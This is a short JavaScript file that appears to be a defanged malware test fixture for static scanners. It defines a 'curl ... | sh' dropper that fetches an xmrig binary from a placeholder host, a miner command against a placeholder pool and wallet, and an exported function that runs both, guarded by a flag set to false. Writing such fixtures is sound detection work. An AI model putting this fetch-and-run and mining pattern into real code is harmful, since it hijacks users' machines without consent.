/*
 * INERT MALWARE TEST FIXTURE — NOT REAL MALWARE.
 * Signature: downloads a mining binary and launches it against a pool.
 * Defanged: guard is always false; the URL/pool are example placeholders, so
 * nothing is downloaded or executed when this file runs.
 */
'use strict';

const { exec } = require('child_process');

const ENABLE_MINER = false; // never true — keeps this fixture inert

// signature: pipe a remote script straight into a shell (curl | sh)
const DROPPER = 'curl -s https://downloads.example.com/xmrig | sh';

// signature: known miner invocation against a pool + wallet
const MINER_CMD =
  './xmrig --url=pool.example.com:3333 --user=WALLET_PLACEHOLDER --donate-level=1';

function deployMiner() {
  exec(DROPPER, () => {
    exec(MINER_CMD);
  });
}

if (ENABLE_MINER) {
  // Unreachable: present only so static scanners can flag the pattern.
  deployMiner();
}

module.exports = { deployMiner };
